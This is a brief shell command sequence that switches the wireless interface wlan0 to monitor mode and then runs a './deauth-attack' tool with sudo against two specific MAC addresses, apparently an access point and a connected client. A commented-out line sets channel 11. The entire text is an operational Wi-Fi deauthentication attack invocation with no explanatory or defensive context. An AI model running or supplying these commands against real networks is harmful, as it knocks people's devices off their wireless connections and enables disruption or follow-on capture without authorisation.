sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# sudo iwconfig wlan0 channel 11

sudo ./deauth-attack wlan0 BC:62:CE:F7:BB:DA 86:D2:53:06:ee:a9 -auth
